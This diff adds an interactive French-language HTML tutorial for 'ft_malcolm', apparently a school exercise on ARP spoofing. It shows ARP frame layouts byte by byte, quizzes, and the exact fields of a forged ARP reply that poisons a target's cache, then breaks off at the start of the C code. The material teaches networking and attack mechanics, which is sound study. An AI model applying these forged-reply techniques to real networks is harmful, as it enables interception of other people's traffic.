@@ -1,0 +1,1482 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ft_malcolm — Guide Interactif</title>
+<style>
+:root {
+  --bg:#0d1117; --bg2:#161b22; --bg3:#21262d; --border:#30363d;
+  --text:#e6edf3; --muted:#8b949e;
+  --blue:#58a6ff; --green:#3fb950; --red:#f85149;
+  --yellow:#e3b341; --cyan:#39c5cf; --purple:#bc8cff; --orange:#ffa657;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);display:flex;min-height:100vh;font-size:15px;}
+
+/* ── Sidebar ── */
+#sidebar{width:270px;background:var(--bg2);border-right:1px solid var(--border);position:fixed;top:0;left:0;height:100vh;overflow-y:auto;display:flex;flex-direction:column;}
+.logo{padding:20px;border-bottom:1px solid var(--border);}
+.logo h1{font-family:monospace;font-size:1.05rem;color:var(--cyan);letter-spacing:1px;}
+.logo p{font-size:.75rem;color:var(--muted);margin-top:4px;}
+.progress-wrap{padding:12px 20px;border-bottom:1px solid var(--border);}
+.progress-label{font-size:.72rem;color:var(--muted);margin-bottom:5px;display:flex;justify-content:space-between;}
+.progress-bar{height:3px;background:var(--border);border-radius:2px;overflow:hidden;}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--blue),var(--cyan));border-radius:2px;transition:width .5s ease;}
+.step-item{display:flex;align-items:flex-start;gap:12px;padding:12px 20px;cursor:pointer;border-left:3px solid transparent;transition:all .2s;position:relative;}
+.step-item:hover:not(.locked){background:var(--bg3);}
+.step-item.active{border-left-color:var(--blue);background:var(--bg3);}
+.step-item.locked{opacity:.35;cursor:not-allowed;}
+.step-item.done .s-icon{color:var(--green);}
+.step-item.active .s-icon{color:var(--blue);}
+.s-icon{font-size:1rem;margin-top:1px;flex-shrink:0;width:20px;text-align:center;}
+.s-title{font-size:.82rem;font-weight:600;line-height:1.3;}
+.s-sub{font-size:.72rem;color:var(--muted);margin-top:2px;}
+
+/* ── Main ── */
+#main{margin-left:270px;flex:1;padding:40px 48px;max-width:900px;}
+.step-badge{font-size:.72rem;color:var(--muted);font-family:monospace;margin-bottom:8px;letter-spacing:.5px;}
+h2.step-title{font-size:1.7rem;margin-bottom:10px;}
+.step-desc{color:var(--muted);line-height:1.7;margin-bottom:32px;font-size:.92rem;}
+hr.divider{border:none;border-top:1px solid var(--border);margin:32px 0;}
+
+/* ── Section ── */
+.section{margin-bottom:36px;}
+.section > h3{font-size:1rem;color:var(--blue);margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;}
+.section p,.section li{line-height:1.75;color:var(--text);margin-bottom:8px;font-size:.9rem;}
+.section ul,.section ol{padding-left:22px;}
+
+/* ── Tables ── */
+.tbl-wrap{overflow-x:auto;margin:12px 0 20px;}
+table{width:100%;border-collapse:collapse;font-size:.82rem;font-family:monospace;}
+th{background:var(--bg3);color:var(--muted);padding:8px 12px;text-align:left;border:1px solid var(--border);}
+td{padding:8px 12px;border:1px solid var(--border);vertical-align:top;}
+tr:nth-child(even) td{background:var(--bg2);}
+td.mono{font-family:monospace;color:var(--cyan);}
+td.highlight{color:var(--orange);}
+
+/* ── Code ── */
+pre{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:16px;overflow-x:auto;font-family:'Courier New',monospace;font-size:.82rem;line-height:1.65;margin:12px 0;}
+.kw{color:#ff7b72;} .ty{color:var(--orange);} .cm{color:var(--muted);font-style:italic;}
+.st{color:#a5d6ff;} .nu{color:#79c0ff;} .fn{color:var(--purple);} .pp{color:var(--yellow);}
+.hl{background:#ffffff15;border-radius:3px;padding:0 2px;}
+
+/* ── Byte Frame ── */
+.frame-outer{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:20px;margin:16px 0;}
+.frame-label{font-size:.75rem;color:var(--muted);margin-bottom:4px;font-family:monospace;}
+.frame-seg-label{font-size:.7rem;color:var(--muted);padding:2px 6px;background:var(--bg2);border-radius:3px;display:inline-block;margin-bottom:6px;}
+.byte-row{display:flex;flex-wrap:wrap;gap:3px;margin-bottom:4px;}
+.byte{width:44px;height:44px;display:flex;flex-direction:column;align-items:center;justify-content:center;border-radius:5px;cursor:pointer;border:2px solid transparent;transition:all .15s;font-family:monospace;}
+.byte:hover{transform:scale(1.08);border-color:#ffffff60;}
+.byte.sel{transform:scale(1.1);border-color:#fff;box-shadow:0 0 10px #ffffff30;}
+.byte .bv{font-size:.72rem;font-weight:bold;}
+.byte .bi{font-size:.55rem;opacity:.55;}
+.f0{background:#1a3a5c;color:#6bb3f0;} /* eth dst */
+.f1{background:#1a4a3a;color:#6bf0a8;} /* eth src */
+.f2{background:#4a3a1a;color:#f0c86b;} /* ethertype */
+.f3{background:#3a1a4a;color:#c06bf0;} /* hw_type */
+.f4{background:#3a3a1a;color:#f0f06b;} /* proto_type */
+.f5{background:#1a3a3a;color:#6bf0f0;} /* hw/proto size */
+.f6{background:#4a1a1a;color:#f06b6b;} /* opcode */
+.f7{background:#1a4a2a;color:#a8f06b;} /* sender mac */
+.f8{background:#2a1a4a;color:#a86bf0;} /* sender ip */
+.f9{background:#4a2a1a;color:#f0906b;} /* target mac */
+.f10{background:#1a2a4a;color:#6ba8f0;} /* target ip */
+.byte-info-box{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin-top:10px;font-family:monospace;font-size:.83rem;min-height:75px;}
+.bib-field{color:var(--cyan);font-weight:bold;font-size:.95rem;}
+.bib-off{color:var(--muted);font-size:.75rem;margin-left:8px;}
+.bib-val{color:var(--green);margin-top:4px;}
+.bib-desc{color:var(--text);margin-top:6px;line-height:1.6;font-family:'Segoe UI',sans-serif;font-size:.85rem;}
+.legend{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0;}
+.legend-i{display:flex;align-items:center;gap:5px;font-size:.73rem;color:var(--muted);}
+.legend-dot{width:11px;height:11px;border-radius:2px;}
+
+/* ── Quiz ── */
+.quiz-box{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:24px;margin:20px 0;}
+.quiz-box h3{color:var(--yellow);font-size:1rem;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid var(--border);}
+.quiz-q{margin-bottom:24px;}
+.quiz-q .qtext{font-size:.9rem;line-height:1.65;margin-bottom:12px;font-weight:500;}
+.options{display:flex;flex-direction:column;gap:7px;}
+.opt{display:flex;align-items:flex-start;gap:10px;padding:10px 14px;border:1px solid var(--border);border-radius:7px;cursor:pointer;transition:all .2s;background:var(--bg3);user-select:none;}
+.opt:hover:not(.done){border-color:var(--blue);}
+.opt.correct{border-color:var(--green);background:#1a3a1a;}
+.opt.wrong{border-color:var(--red);background:#3a1a1a;}
+.opt.done{cursor:default;}
+.opt-radio{width:14px;height:14px;border-radius:50%;border:2px solid var(--muted);flex-shrink:0;margin-top:2px;transition:all .2s;}
+.opt.correct .opt-radio{border-color:var(--green);background:var(--green);}
+.opt.wrong .opt-radio{border-color:var(--red);background:var(--red);}
+.opt-label{font-size:.87rem;line-height:1.5;}
+.explanation{display:none;margin-top:10px;padding:12px 14px;background:var(--bg);border-left:3px solid var(--blue);border-radius:4px;font-size:.83rem;line-height:1.65;color:var(--muted);}
+.explanation.show{display:block;}
+.explanation strong{color:var(--text);}
+.q-score{font-size:.8rem;color:var(--muted);margin-top:4px;}
+
+/* ── Alerts ── */
+.alert{padding:12px 16px;border-radius:7px;margin:14px 0;font-size:.87rem;line-height:1.65;border-left:4px solid;}
+.alert-info{background:#1a2a3a;border-color:var(--blue);}
+.alert-warn{background:#3a2a1a;border-color:var(--yellow);}
+.alert-ok{background:#1a3a1a;border-color:var(--green);}
+.alert-danger{background:#3a1a1a;border-color:var(--red);}
+
+/* ── Buttons ── */
+.btn{display:inline-flex;align-items:center;gap:7px;padding:9px 18px;border-radius:7px;border:none;cursor:pointer;font-size:.87rem;font-weight:600;transition:all .2s;font-family:inherit;}
+.btn-primary{background:var(--blue);color:#000;}
+.btn-primary:hover{background:#79b8ff;}
+.btn-success{background:var(--green);color:#000;}
+.btn-secondary{background:var(--bg3);color:var(--text);border:1px solid var(--border);}
+.btn-secondary:hover{border-color:var(--blue);}
+.btn:disabled{opacity:.45;cursor:not-allowed;}
+
+/* ── Code Editor ── */
+.editor-wrap{background:var(--bg3);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin:14px 0;}
+.editor-head{background:var(--bg2);padding:8px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border);font-size:.78rem;color:var(--muted);font-family:monospace;}
+.editor-ta{width:100%;background:var(--bg3);color:var(--text);border:none;padding:14px 16px;font-family:'Courier New',monospace;font-size:.82rem;line-height:1.65;resize:vertical;min-height:220px;outline:none;}
+
+/* ── Interactive exercises ── */
+.exo-box{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:22px;margin:18px 0;}
+.exo-box h4{font-size:.9rem;color:var(--orange);margin-bottom:14px;}
+.mac-live-wrap{display:flex;align-items:center;gap:16px;flex-wrap:wrap;}
+.mac-input-big{background:var(--bg3);border:2px solid var(--border);border-radius:7px;padding:10px 14px;color:var(--text);font-family:monospace;font-size:1rem;outline:none;width:220px;transition:border-color .2s;}
+.mac-input-big:focus{border-color:var(--blue);}
+.mac-input-big.valid{border-color:var(--green);}
+.mac-input-big.invalid{border-color:var(--red);}
+.parsed-bytes{display:flex;gap:5px;flex-wrap:wrap;}
+.pbyte{width:38px;height:38px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;display:flex;align-items:center;justify-content:center;font-family:monospace;font-size:.75rem;color:var(--muted);transition:all .3s;}
+.pbyte.filled{background:#1a3a5c;color:#6bb3f0;border-color:#6bb3f060;}
+
+.ip-input-big{background:var(--bg3);border:2px solid var(--border);border-radius:7px;padding:10px 14px;color:var(--text);font-family:monospace;font-size:1rem;outline:none;width:180px;transition:border-color .2s;}
+.ip-input-big:focus{border-color:var(--blue);}
+.ip-input-big.valid{border-color:var(--green);}
+.ip-input-big.invalid{border-color:var(--red);}
+.ip-bytes{display:flex;gap:5px;}
+.ipbyte{width:44px;height:38px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;display:flex;align-items:center;justify-content:center;font-family:monospace;font-size:.75rem;color:var(--muted);transition:all .3s;}
+.ipbyte.filled{background:#2a1a4a;color:#a86bf0;border-color:#a86bf060;}
+
+/* Packet filter quiz */
+.pkt-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin:14px 0;}
+.pkt-card{background:var(--bg3);border:2px solid var(--border);border-radius:8px;padding:14px;cursor:pointer;transition:all .2s;position:relative;}
+.pkt-card:hover:not(.answered){border-color:var(--blue);}
+.pkt-card.selected{border-color:var(--blue);background:#1a2a3a;}
+.pkt-card.correct-answer{border-color:var(--green);background:#1a3a1a;}
+.pkt-card.wrong-answer{border-color:var(--red);background:#3a1a1a;}
+.pkt-card .pkt-title{font-size:.8rem;font-weight:bold;color:var(--muted);margin-bottom:8px;font-family:monospace;}
+.pkt-field{display:flex;justify-content:space-between;font-size:.78rem;font-family:monospace;margin-bottom:3px;}
+.pkt-field .pf-key{color:var(--muted);}
+.pkt-field .pf-val{color:var(--cyan);}
+.pkt-verdict{position:absolute;top:8px;right:10px;font-size:1rem;}
+
+/* Packet builder */
+.pkt-builder{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:14px 0;}
+.field-row{display:flex;flex-direction:column;gap:4px;}
+.field-row label{font-size:.75rem;color:var(--muted);font-family:monospace;}
+.field-input{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:7px 10px;color:var(--text);font-family:monospace;font-size:.82rem;outline:none;transition:border-color .2s;}
+.field-input:focus{border-color:var(--blue);}
+.field-input.ok{border-color:var(--green);}
+.field-input.bad{border-color:var(--red);}
+.field-hint{font-size:.72rem;color:var(--muted);font-style:italic;}
+
+/* Scenario display */
+.scenario-timeline{position:relative;padding-left:30px;}
+.scenario-timeline::before{content:'';position:absolute;left:10px;top:0;bottom:0;width:2px;background:var(--border);}
+.sc-step{position:relative;margin-bottom:24px;opacity:.4;transition:opacity .4s;}
+.sc-step.active{opacity:1;}
+.sc-dot{position:absolute;left:-24px;top:4px;width:16px;height:16px;border-radius:50%;background:var(--border);border:2px solid var(--border);transition:all .4s;}
+.sc-step.active .sc-dot{background:var(--blue);border-color:var(--blue);}
+.sc-step.done .sc-dot{background:var(--green);border-color:var(--green);}
+.sc-label{font-size:.82rem;font-weight:600;color:var(--text);margin-bottom:4px;}
+.sc-desc{font-size:.8rem;color:var(--muted);line-height:1.55;}
+.sc-pkt{background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:7px 12px;font-family:monospace;font-size:.73rem;margin-top:6px;color:var(--cyan);}
+
+/* Unlock section */
+.unlock-section{text-align:center;padding:28px;margin-top:28px;border-top:1px solid var(--border);}
+.unlock-score{font-size:1.1rem;margin-bottom:14px;}
+.unlock-score.perfect{color:var(--green);}
+.unlock-score.partial{color:var(--yellow);}
+
+/* Checklist */
+.checklist{display:flex;flex-direction:column;gap:8px;margin:12px 0;}
+.check-item{display:flex;align-items:flex-start;gap:10px;padding:9px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;cursor:pointer;transition:all .2s;user-select:none;}
+.check-item:hover{border-color:var(--blue);}
+.check-item.checked{border-color:var(--green);background:#1a3a1a;}
+.check-box{width:16px;height:16px;border:2px solid var(--muted);border-radius:3px;flex-shrink:0;margin-top:1px;transition:all .2s;display:flex;align-items:center;justify-content:center;}
+.check-item.checked .check-box{border-color:var(--green);background:var(--green);}
+.check-label{font-size:.85rem;line-height:1.5;}
+
+/* Tabs */
+.tabs{display:flex;gap:4px;border-bottom:1px solid var(--border);margin-bottom:18px;}
+.tab{padding:8px 16px;border-radius:6px 6px 0 0;cursor:pointer;font-size:.82rem;color:var(--muted);border:1px solid transparent;border-bottom:none;transition:all .2s;margin-bottom:-1px;}
+.tab:hover{color:var(--text);}
+.tab.active{background:var(--bg3);color:var(--text);border-color:var(--border);border-bottom-color:var(--bg3);}
+.tab-pane{display:none;} .tab-pane.active{display:block;}
+
+/* Scroll */
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg2);}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+
+@media(max-width:768px){#sidebar{display:none;}#main{margin-left:0;padding:20px;}}
+</style>
+</head>
+<body>
+
+<nav id="sidebar">
+  <div class="logo">
+    <h1>ft_malcolm</h1>
+    <p>Guide interactif — ARP spoofing</p>
+  </div>
+  <div class="progress-wrap">
+    <div class="progress-label"><span>Progression</span><span id="prog-pct">0%</span></div>
+    <div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
+  </div>
+  <div id="step-list"></div>
+</nav>
+
+<main id="main">
+  <div id="content"></div>
+</main>
+
+<script>
+// ─── State ───────────────────────────────────────────────────────────────────
+const TOTAL = 7;
+let state = JSON.parse(localStorage.getItem('ftm_state') || 'null') || {
+  current: 0,
+  unlocked: [true,false,false,false,false,false,false],
+  done: [false,false,false,false,false,false,false],
+  quiz: {}
+};
+
+function save() { localStorage.setItem('ftm_state', JSON.stringify(state)); }
+
+// ─── Step metadata ────────────────────────────────────────────────────────────
+const STEPS = [
+  { title:"ARP au niveau octet", sub:"Théorie + visualisation", icon:"📡" },
+  { title:"Le squelette C", sub:"Header, structs packed", icon:"🏗️" },
+  { title:"Parsing des arguments", sub:"MAC, IP, validation", icon:"🔍" },
+  { title:"Réseau bas niveau", sub:"Socket RAW, bind, interface", icon:"🔌" },
+  { title:"Réception filtrée", sub:"recvfrom + filtrage ARP", icon:"📥" },
+  { title:"Construction du reply", sub:"Forger et envoyer la trame", icon:"⚡" },
+  { title:"Bonus", sub:"Verbose, gratuitous, NDP/IPv6", icon:"🎯" },
+];
+
+// ─── Byte frame data ─────────────────────────────────────────────────────────
+const FRAME_BYTES = [
+  // Ethernet dst MAC — ff:ff:ff:ff:ff:ff (broadcast)
+  {v:'FF',f:0,grp:'Ethernet dst MAC'},
+  {v:'FF',f:0},{v:'FF',f:0},{v:'FF',f:0},{v:'FF',f:0},{v:'FF',f:0},
+  // Ethernet src MAC — AA:AA:AA:AA:AA:AA (Target: 10.0.0.5)
+  {v:'AA',f:1,grp:'Ethernet src MAC'},
+  {v:'AA',f:1},{v:'AA',f:1},{v:'AA',f:1},{v:'AA',f:1},{v:'AA',f:1},
+  // Ethertype — 0x0806 = ARP
+  {v:'08',f:2,grp:'Ethertype'},{v:'06',f:2},
+  // hw_type — 0x0001 = Ethernet
+  {v:'00',f:3,grp:'hw_type'},{v:'01',f:3},
+  // proto_type — 0x0800 = IPv4
+  {v:'08',f:4,grp:'proto_type'},{v:'00',f:4},
+  // hw_size & proto_size
+  {v:'06',f:5,grp:'hw_size'},{v:'04',f:5,grp:'proto_size'},
+  // opcode — 0x0001 = Request
+  {v:'00',f:6,grp:'opcode'},{v:'01',f:6},
+  // ARP sender MAC — AA:AA:AA:AA:AA:AA
+  {v:'AA',f:7,grp:'ARP sender MAC'},
+  {v:'AA',f:7},{v:'AA',f:7},{v:'AA',f:7},{v:'AA',f:7},{v:'AA',f:7},
+  // ARP sender IP — 10.0.0.5
+  {v:'0A',f:8,grp:'ARP sender IP'},{v:'00',f:8},{v:'00',f:8},{v:'05',f:8},
+  // ARP target MAC — 00:00:00:00:00:00 (inconnu)
+  {v:'00',f:9,grp:'ARP target MAC'},
+  {v:'00',f:9},{v:'00',f:9},{v:'00',f:9},{v:'00',f:9},{v:'00',f:9},
+  // ARP target IP — 10.0.0.10
+  {v:'0A',f:10,grp:'ARP target IP'},{v:'00',f:10},{v:'00',f:10},{v:'0A',f:10},
+];
+
+const FIELD_INFO = [
+  { name:'Ethernet DST MAC', color:'#6bb3f0', bg:'#1a3a5c',
+    desc:'À qui on envoie la trame Ethernet. Pour une ARP request = <strong>FF:FF:FF:FF:FF:FF</strong> (broadcast : tout le LAN reçoit). Pour un reply = la MAC de la machine à qui on répond.' },
+  { name:'Ethernet SRC MAC', color:'#6bf0a8', bg:'#1a4a3a',
+    desc:'Qui envoie la trame. La carte réseau qui émet remplit ce champ avec sa propre MAC automatiquement (ou on le fait à la main en raw socket).' },
+  { name:'Ethertype', color:'#f0c86b', bg:'#4a3a1a',
+    desc:'Indique aux couches supérieures comment décoder le payload. <strong>0x0806 = ARP</strong>. 0x0800 = IPv4. 0x86DD = IPv6. Sans ce champ, on ne saurait pas quoi faire des 28 octets suivants.' },
+  { name:'hw_type', color:'#c06bf0', bg:'#3a1a4a',
+    desc:'Type de médium physique. <strong>0x0001 = Ethernet</strong>. Indique que les adresses matérielles sont des MAC 48 bits.' },
+  { name:'proto_type', color:'#f0f06b', bg:'#3a3a1a',
+    desc:'Protocole de couche 3 concerné par cette résolution. <strong>0x0800 = IPv4</strong>. C\'est le même encodage que l\'Ethertype — pas un hasard.' },
+  { name:'hw_size / proto_size', color:'#6bf0f0', bg:'#1a3a3a',
+    desc:'Tailles des adresses. hw_size = <strong>6</strong> (MAC = 6 octets). proto_size = <strong>4</strong> (IPv4 = 4 octets). Ces champs rendent ARP générique : en théorie, il marcherait avec d\'autres protocoles.' },
+  { name:'opcode', color:'#f06b6b', bg:'#4a1a1a',
+    desc:'<strong>0x0001 = Request</strong> (« qui a cette IP ? »). <strong>0x0002 = Reply</strong> (« c\'est moi, voilà ma MAC »). ft_malcolm intercepte les requests (1) et envoie un reply (2) falsifié.' },
+  { name:'ARP Sender MAC', color:'#a8f06b', bg:'#1a4a2a',
+    desc:'MAC de l\'émetteur du paquet ARP. Dans la request, c\'est la MAC de Target (AA:AA…). Dans le reply forgé, tu mets <strong>ta propre MAC</strong> (ou une MAC fictive).' },
+  { name:'ARP Sender IP', color:'#a86bf0', bg:'#2a1a4a',
+    desc:'IP de l\'émetteur du paquet ARP. Ici 10.0.0.5 = Target, qui pose la question. Dans le reply forgé, tu mets l\'IP de Source (10.0.0.10) pour dire « c\'est moi qui ai cette IP ».' },
+  { name:'ARP Target MAC', color:'#f0906b', bg:'#4a2a1a',
+    desc:'MAC cible. Dans une request : <strong>00:00:00:00:00:00</strong> (« je ne la connais pas, c\'est ça que je cherche ! »). Dans le reply, c\'est la MAC du destinataire.' },
+  { name:'ARP Target IP', color:'#6ba8f0', bg:'#1a2a4a',
+    desc:'IP cible de la résolution. La question posée : « qui a l\'IP <strong>10.0.0.10</strong> ? ». ft_malcolm attend une request visant cette IP pour y répondre.' },
+];
+
+// ─── Quiz data ────────────────────────────────────────────────────────────────
+const QUIZZES = {
+  0: [
+    {
+      q: "Pourquoi le dst_mac du header Ethernet de ton reply doit-il être la MAC de la target, et pas broadcast ?",
+      opts:[
+        "Parce que le broadcast consomme trop de bande passante.",
+        "Parce qu'on répond spécifiquement à une machine : Target doit recevoir le reply, pas tout le LAN. Unicast = efficace et discret.",
+        "Parce que les switches bloquent les broadcasts ARP.",
+        "Parce que le protocole ARP interdit le broadcast en reply."
+      ],
+      correct:1,
+      expl:"<strong>Un reply ARP est unicast.</strong> On connaît la MAC de Target (elle était dans le champ <em>sender MAC</em> de sa request). Envoyer en broadcast marcherait techniquement, mais tous les hosts du LAN recevraient ta réponse falsifiée — bruyant, indiscret, et inutile. La spec ARP (RFC 826) recommande l'unicast pour les replies."
+    },
+    {
+      q: "Pourquoi dans le payload ARP du reply tu mets opcode = 2 et pas 1 ?",
+      opts:[
+        "Parce que 2 est la valeur par défaut pour les paquets sortants.",
+        "opcode = 1 signifie Request (question), opcode = 2 signifie Reply (réponse). On envoie une réponse, donc 2.",
+        "Parce que l'opcode 1 est réservé aux broadcasts.",
+        "Parce que le noyau Linux change automatiquement le 1 en 2."
+      ],
+      correct:1,
+      expl:"<strong>opcode distingue la question de la réponse.</strong> 1 = Request : « qui a cette IP ? ». 2 = Reply : « c'est moi ». Si tu envoies un paquet avec opcode = 1, Target va l'interpréter comme une question ARP de ta part, pas comme une réponse à sa question. Le poisoning ne fonctionnerait pas."
+    },
+    {
+      q: "Quel est le rôle exact de l'ethertype = 0x0806 dans le header Ethernet ? Que se passerait-il si tu mettais 0x0800 ?",
+      opts:[
+        "C'est un checksum. Avec 0x0800 la trame serait corrompue.",
+        "C'est le numéro de version ARP. 0x0800 activerait la version 2.",
+        "C'est un tag qui dit au récepteur comment parser le payload. Avec 0x0800, il essaierait de lire les 28 octets suivants comme un paquet IPv4 — la trame serait silencieusement ignorée ou mal décodée.",
+        "C'est l'adresse du protocole source. 0x0800 changerait la source en IPv4."
+      ],
+      correct:2,
+      expl:"<strong>L'ethertype est un démultiplexeur de protocole.</strong> Le kernel (et les switches) lisent ce champ pour savoir quoi faire du payload. 0x0806 → passe au module ARP. 0x0800 → passe au module IPv4. Avec 0x0800, la couche IP essaierait de parser des octets ARP comme un header IPv4 (version, TTL, etc.) — ce serait du garbage. La trame serait silencieusement droppée. ft_malcolm doit <em>envoyer</em> 0x0806 et <em>filtrer</em> sur 0x0806 à la réception."
+    }
+  ]
+};
+
+// ─── Step content ─────────────────────────────────────────────────────────────
+function contentStep0() {
+  return `
+<div class="step-badge">ÉTAPE 01 / 07</div>
+<h2 class="step-title">ARP au niveau octet</h2>
+<p class="step-desc">Avant de toucher le moindre fichier C, tu dois visualiser exactement ce qui circule sur le câble. Une trame Ethernet contenant une requête ARP fait <strong>42 octets</strong>. Clique sur chaque octet pour comprendre son rôle.</p>
+
+<div class="section">
+  <h3>📐 Anatomie d'une trame ARP</h3>
+  ${buildByteFrame()}
+</div>
+
+<div class="section">
+  <h3>📋 Header Ethernet (14 octets)</h3>
+  <div class="tbl-wrap">
+  <table>
+    <tr><th>Offset</th><th>Champ</th><th>Taille</th><th>Valeur (request)</th><th>Description</th></tr>
+    <tr><td class="mono">0</td><td>dst_mac</td><td>6 octets</td><td class="mono highlight">FF:FF:FF:FF:FF:FF</td><td>Broadcast → tout le LAN reçoit</td></tr>
+    <tr><td class="mono">6</td><td>src_mac</td><td>6 octets</td><td class="mono">MAC de l'émetteur</td><td>Qui envoie la trame</td></tr>
+    <tr><td class="mono">12</td><td>ethertype</td><td>2 octets</td><td class="mono highlight">0x0806</td><td>0x0806=ARP · 0x0800=IPv4 · 0x86DD=IPv6</td></tr>
+  </table>
+  </div>
+</div>
+
+<div class="section">
+  <h3>📋 Payload ARP (28 octets, offset 14)</h3>
+  <div class="tbl-wrap">
+  <table>
+    <tr><th>Offset ARP</th><th>Champ</th><th>Taille</th><th>Valeur typique</th></tr>
+    <tr><td class="mono">0</td><td>hw_type</td><td>2</td><td class="mono">0x0001 (Ethernet)</td></tr>
+    <tr><td class="mono">2</td><td>proto_type</td><td>2</td><td class="mono">0x0800 (IPv4)</td></tr>
+    <tr><td class="mono">4</td><td>hw_size</td><td>1</td><td class="mono">6 (taille MAC)</td></tr>
+    <tr><td class="mono">5</td><td>proto_size</td><td>1</td><td class="mono">4 (taille IP)</td></tr>
+    <tr><td class="mono">6</td><td>opcode</td><td>2</td><td class="mono highlight">1=request · 2=reply</td></tr>
+    <tr><td class="mono">8</td><td>sender_mac</td><td>6</td><td class="mono">MAC de l'émetteur</td></tr>
+    <tr><td class="mono">14</td><td>sender_ip</td><td>4</td><td class="mono">IP de l'émetteur</td></tr>
+    <tr><td class="mono">20</td><td>target_mac</td><td>6</td><td class="mono highlight">00:00:00:00:00:00 (request)</td></tr>
+    <tr><td class="mono">26</td><td>target_ip</td><td>4</td><td class="mono">IP cherchée</td></tr>
+  </table>
+  </div>
+</div>
+
+<div class="section">
+  <h3>🎯 Le scénario ft_malcolm</h3>
+  <div id="scenario-box">
+    <div style="display:flex;gap:12px;margin-bottom:16px;">
+      <button class="btn btn-secondary" onclick="animScenario()">▶ Lancer l'animation</button>
+      <button class="btn btn-secondary" onclick="resetScenario()">↺ Reset</button>
+    </div>
+    <div class="scenario-timeline">
+      <div class="sc-step active" id="sc0">
+        <div class="sc-dot"></div>
+        <div class="sc-label">1. Target veut joindre Source</div>
+        <div class="sc-desc">Target (10.0.0.5 · AA:AA:AA:AA:AA:AA) ne connaît pas la MAC de Source (10.0.0.10). Son OS broadcast une ARP request.</div>
+        <div class="sc-pkt">Eth[ dst=FF:FF:FF:FF:FF:FF src=AA:AA:AA:AA:AA:AA type=0x0806 ]<br>ARP[ op=1 smac=AA:AA:AA:AA:AA:AA sip=10.0.0.5 tmac=00:00:00:00:00:00 tip=10.0.0.10 ]</div>
+      </div>
+      <div class="sc-step" id="sc1">
+        <div class="sc-dot"></div>
+        <div class="sc-label">2. ft_malcolm intercepte la request</div>
+        <div class="sc-desc">Ton programme tourne sur le LAN. Il reçoit la trame (socket raw), vérifie : ethertype=ARP, opcode=1, tip=10.0.0.10. Ça match → on répond.</div>
+      </div>
+      <div class="sc-step" id="sc2">
+        <div class="sc-dot"></div>
+        <div class="sc-label">3. ft_malcolm envoie un reply forgé</div>
+        <div class="sc-desc">On répond à Target en se faisant passer pour Source. On dit : "L'IP 10.0.0.10, c'est moi, ma MAC c'est BB:BB:BB:BB:BB:BB"</div>
+        <div class="sc-pkt">Eth[ dst=AA:AA:AA:AA:AA:AA src=BB:BB:BB:BB:BB:BB type=0x0806 ]<br>ARP[ op=2 smac=BB:BB:BB:BB:BB:BB sip=10.0.0.10 tmac=AA:AA:AA:AA:AA:AA tip=10.0.0.5 ]</div>
+      </div>
+      <div class="sc-step" id="sc3">
+        <div class="sc-dot"></div>
+        <div class="sc-label">4. Cache ARP de Target empoisonné</div>
+        <div class="sc-desc">Target met à jour son cache : 10.0.0.10 → BB:BB:BB:BB:BB:BB. Toutes ses trames vers "Source" arrivent maintenant chez toi. Mission accomplie.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<hr class="divider">
+<div class="quiz-box" id="quiz0">
+  <h3>✅ Questions de vérification — débloque l'étape 2</h3>
+  ${buildQuiz(0)}
+</div>
+<div class="unlock-section" id="unlock0" style="display:none;">
+  <div class="unlock-score perfect" id="unlock0-score"></div>
+  <button class="btn btn-success" onclick="unlockStep(1)">Passer à l'étape 2 — Le squelette C →</button>
+</div>
+`;
+}
+
+function contentStep1() {
+  return `
+<div class="step-badge">ÉTAPE 02 / 07</div>
+<h2 class="step-title">Le squelette C</h2>
+<p class="step-desc">Avant d'écrire la logique, il faut mettre en place la structure du projet : le header, les structs qui <em>mappent exactement</em> les bytes réseau, et pourquoi <code>__attribute__((packed))</code> est obligatoire.</p>
+
+<div class="section">
+  <h3>📁 Structure du projet</h3>
+  <pre>ft_malcolm/
+├── Makefile
+├── ft_malcolm.h        ← tous les includes, structs, prototypes
+├── main.c              ← entry point, gestion globale
+├── parse.c             ← parsing MAC/IP
+├── network.c           ← socket, bind, send
+└── arp.c               ← logique ARP : filtre, forge, reply</pre>
+</div>
+
+<div class="section">
+  <h3>⚠️ Pourquoi <code>__attribute__((packed))</code> est vital</h3>
+  <p>Le compilateur C ajoute normalement du <strong>padding</strong> entre les champs d'une struct pour aligner en mémoire. Si tu maps une struct sur des bytes réseau <em>sans</em> packed, les offsets seront faux.</p>
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab(this,'tab-bad')">❌ Sans packed (faux)</div>
+    <div class="tab" onclick="switchTab(this,'tab-good')">✅ Avec packed (correct)</div>
+  </div>
+  <div class="tab-pane active" id="tab-bad">
+    <pre><span class="kw">struct</span> <span class="ty">arp_s</span> {
+    <span class="ty">uint16_t</span> hw_type;    <span class="cm">// offset 0  → OK</span>
+    <span class="ty">uint16_t</span> proto;      <span class="cm">// offset 2  → OK</span>
+    <span class="ty">uint8_t</span>  hw_size;    <span class="cm">// offset 4  → OK</span>
